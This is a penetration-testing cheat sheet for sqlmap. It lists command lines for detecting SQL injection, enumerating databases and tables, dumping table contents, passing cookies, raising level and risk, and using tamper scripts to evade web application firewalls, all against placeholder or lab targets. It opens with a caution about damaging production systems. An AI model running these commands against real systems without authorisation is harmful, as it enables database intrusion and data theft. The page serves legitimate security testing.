---
description: >-
  sqlmap is an open source penetration testing tool that automates the process
  of detecting and exploiting SQL injection flaws and taking over of database
  servers.
---

# sqlmap

{% embed url="https://sqlmap.org/" %}

{% hint style="danger" %}
Just like any fuzzing tool, these scans need to be slowed down when testing production instances as it could lead to an unintended denial of service. In addition to that, testers need to use those tools with the greatest care since creating issues with production instances databases (like overwriting or deleting data) could have a serious fallout.
{% endhint %}

### Common techniques

{% code overflow="wrap" %}
```bash
# GET Request  
sqlmap -u “http://takumatest.domain/param1=value1&param2=value2"

# GET Request with a specific param
sqlmap -u “http://takumatest.domain/param1=value1&param2=value2" -p param2

# No User Interaction
sqlmap  -u “http://takumatest.domain/" --batch 

# Enumerate database
sqlmap  -u “http://takumatest.domain/" --dbs 

# Enumerate tables
sqlmap -u “http://takumatest.domain/" -D target_DB --tables

# Dump tables 
sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB -T target_Table --dump

# List Columns
sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB -T target_Table --columns 

# POST Request
sqlmap --dbms=mysql -u “http://takumatest.domain/" --data=”data1=aaa&data2=bbb”

# With cookies
python sqlmap.py -u "http://targeturl" --cookie="param1=value1*;param2=value2" 

# Level and Risk
python sqlmap.py -u "http://targeturl" --dbms=mysql --level 5 and --risk 3 

# Combinations 
sqlmap -u ‘http://targeturl/' --data=’param1=blah&param2=blah’ --cookie=’JSESSIONID=d02084cbe50e16aa4' --batch --threads=10 --level=5 --risk=3 -p param1

# BURP File
sqlmap -r metapress.req -p total_service --batch -dump 

# WAF Bypass 
-tamper=”between,randomcase,space2comment”

sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -vvv  

# Clear cache
--fresh-queries
--flush-session
```
{% endcode %}
